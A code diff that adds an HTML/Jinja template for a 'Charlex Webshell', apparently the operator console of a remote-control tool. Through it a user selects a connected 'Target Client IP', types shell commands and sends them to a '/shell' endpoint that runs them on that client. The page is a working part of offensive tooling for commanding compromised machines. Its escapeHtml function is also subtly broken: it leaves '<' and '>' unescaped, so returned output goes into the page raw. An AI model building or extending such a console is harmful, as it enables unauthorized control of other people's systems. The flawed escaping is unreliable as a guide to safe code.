@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Charlex Webshell</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+        #header {
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px #00ff00;
+            text-align: center;
+        }
+        #controls {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            gap: 10px;
+        }
+        #target_ip {
+            padding: 5px;
+            font-size: 16px;
+            background-color: #222;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            border-radius: 4px;
+        }
+        #output {
+            white-space: pre-wrap;
+            flex-grow: 1;
+            overflow-y: auto;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            background-color: #001100;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        #command {
+            width: 100%;
+            padding: 12px;
+            background-color: #222;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 16px;
+            border-radius: 4px;
+        }
+        #command:focus {
+            outline: none;
+            border-color: #00cc00;
+            box-shadow: 0 0 8px #00cc00;
+        }
+        #clearBtn {
+            background-color: #00cc00;
+            border: none;
+            color: black;
+            padding: 6px 12px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #clearBtn:hover {
+            background-color: #009900;
+        }
+    </style>
+</head>
+<body>
+    <div id="header">Charlex Webshell</div>
+    <div id="controls">
+        <label for="target_ip">Target Client IP:</label>
+        <select id="target_ip">
+            {% for client in clients %}
+            <option value="{{ client }}">{{ client }}</option>
+            {% endfor %}
+        </select>
+        <button id="clearBtn" title="Clear output">Clear</button>
+    </div>
+    <div id="output"></div>
+    <input type="text" id="command" placeholder="Enter command and press Enter" autocomplete="off" autofocus />
+    <script>
+        const output = document.getElementById('output');
+        const commandInput = document.getElementById('command');
+        const targetSelect = document.getElementById('target_ip');
+        const clearBtn = document.getElementById('clearBtn');
+
+        clearBtn.addEventListener('click', () => {
+            output.textContent = '';
+            commandInput.focus();
+        });
+
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '<',
+                '>': '>',
+                '"': '"',
+                "'": '&#039;',
+                '\\n': '<br>',
+                '\\r': ''
+            };
+            return text.replace(/[&<>"'\\n\\r]/g, function(m) { return map[m]; });
+        }
+
+        commandInput.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                const cmd = commandInput.value.trim();
+                if (cmd === '') return;
+                const target_ip = targetSelect.value;
+                output.innerHTML += '> ' + escapeHtml(cmd) + '<br>';
+                fetch('/shell', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ command: cmd, target_ip: target_ip })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    output.innerHTML += escapeHtml(data.output) + '<br>';
+                    output.scrollTop = output.scrollHeight;
+                })
+                .catch(err => {
+                    output.innerHTML += 'Error: ' + escapeHtml(err) + '<br>';
+                    output.scrollTop = output.scrollHeight;
+                });
+                commandInput.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
